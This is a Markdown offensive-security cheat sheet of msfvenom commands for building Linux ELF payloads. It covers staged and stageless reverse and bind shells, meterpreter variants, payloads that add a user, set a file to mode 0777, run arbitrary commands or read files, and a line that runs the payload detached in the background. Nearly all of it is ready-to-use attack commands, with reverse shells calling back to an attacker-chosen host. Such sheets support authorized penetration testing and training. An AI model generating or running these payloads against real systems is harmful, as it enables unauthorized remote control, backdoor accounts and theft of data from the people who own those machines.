# ELF Execution

## 01 - Generate Payloads

### 1.1 - Reverse Shells

Staged x86-64 (64-bit) reverse shell.

```
$ msfvenom -p linux/x64/shell/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x64
```

Stageless x86-64 (64-bit) reverse shell.

```
$ msfvenom -p linux/x64/shell_reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x64
```

Staged x86_64 (64-bit) `meterpreter` reverse shell.

```
$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o payload-x64
```

Stageless x86_64 (64-bit) `meterpreter` reverse shell.

```
$ msfvenom -p linux/x64/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f elf -o payload-x64

$ msfvenom -p linux/x64/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f elf -o payload-x64
```

Staged x86 (32-bit) reverse shell.

```
$ msfvenom -p linux/x86/shell/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x86
```

Stageless x86 (32-bit) reverse shell.

```
$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<IP> lport=<PORT> -f elf -o shell-x86
```

Staged x86 (32-bit) `meterpreter` reverse shell.

```
$ msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f elf -o payload-x86
```

Stageless x86 (32-bit) `meterpreter` reverse shell.

```
$ msfvenom -p linux/x86/meterpreter_reverse_http lhost=<IP> lport=<PORT> -f elf -o payload-x86

$ msfvenom -p linux/x86/meterpreter_reverse_https handlersslcert=<FILE.pem> sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT> -f elf -o payload-x86
```

### 1.2 - Bind Shells

Staged x86-64 (64-bit) bind shell.

```
$ msfvenom -p linux/x64/shell/bind_tcp lport=<PORT> -f elf -o shell-x86-64
```

Stageless x86-64 (64-bit) bind shell.

```
$ msfvenom -p linux/x64/shell_bind_tcp lport=<PORT> -f elf -o shell-x86-64
```

Staged x86-64 (64-bit) `meterpreter` bind shell.

```
$ msfvenom -p linux/x64/meterpreter/bind_tcp lport=<PORT> -f elf -o payload-x64
```

Staged x86 (32-bit) bind shell.

```
$ msfvenom -p linux/x86/shell/bind_tcp lport=<PORT> -f elf -o shell-x86
```

Stageless x86 (32-bit) bind shell.

```
$ msfvenom -p linux/x86/shell_bind_tcp lport=<PORT> -f elf -o shell-x86
```

Staged x86 (32-bit) `meterpreter` bind shell.

```
$ msfvenom -p linux/x86/meterpreter/bind_tcp lport=<PORT> -f elf -o payload-x86
```

### 1.3 - Executable Binary Payloads

#### 1.3.1 - Add User Linux Exec Payload

```
$ msfvenom -p linux/x86/adduser user=<username> pass=<password> shell=/bin/sh -f elf -o payload-x86
```

#### 1.3.2 - Execute Linux Exec Payload

```
$ msfvenom -p linux/x86/chmod file=/path/to/file mode=0777 -f elf -o payload-x86

$ msfvenom -p linux/x86/exec cmd="<commands>" -f elf -o payload-x86

$ msfvenom -p linux/x86/read_file fd=1 path=/path/to/file -f elf -o payload-x86
```

## 02 - Execute Payloads

```
$ chmod +x payload && ./payload & disown
```